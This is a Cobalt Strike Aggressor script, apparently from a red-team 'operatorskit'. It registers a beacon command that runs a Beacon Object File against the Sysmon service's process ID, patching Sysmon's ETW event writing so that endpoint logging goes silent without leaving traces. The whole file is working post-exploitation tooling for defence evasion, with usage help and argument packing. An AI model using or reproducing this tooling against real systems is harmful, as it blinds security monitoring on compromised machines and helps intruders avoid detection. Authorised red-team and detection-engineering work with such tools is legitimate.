# author REDMED-X

beacon_command_register(
    "silencesysmon",
    "Silence Sysmon by patching its capability to write ETW events to the log.",
    "INFO:\n" .
    "  Silence the Sysmon service by patching its capability to write ETW events to the log.\n" .
    "  Restarting the Sysmon service or the system itself will clear the patch and Sysmon will resume working normally.\n" .
    "  Altough this will not leave any traces in the log, there will be a time gap between the last and first new event.\n\n" .
    
    "OPTIONS:\n" .
    "  [pid]: the process ID of the Sysmon service running on the system.\n\n" .
    "USAGE:\n" .
    "  silencesysmon <sysmon pid>\n\n",
    "operatorskit"
);

alias silencesysmon
{
    local('$bid %cmd $arg_data $bof_path $output_name');
    local('$pid');
    
    ($bid) = @_;

    $bof_path    = "silencesysmon.o";
	$output_name = "silence_sysmon";

    %cmd = parse_command(@_);

    if (%cmd is $null)
    {
        berror($bid, "Error parsing command\n");
        return;
    }

    %cmd["file"] = generate_file_name($bid, %cmd["file"], $output_name);

    $pid = %cmd["args"][0];

    #
    # Validation
    #

    if ($pid eq "")
    {
        berror($bid, "Please specify the process ID of the Sysmon service.\n");
        return;
    }

    #
    # Pack arguments
    #

    $arg_data  = bof_pack($bid, "i", $pid);

    blog($bid, "Tasked to silence Sysmon..");

    handle_output_beacon_inline_execute($bid, $bof_path, "go", %cmd, $arg_data);
}


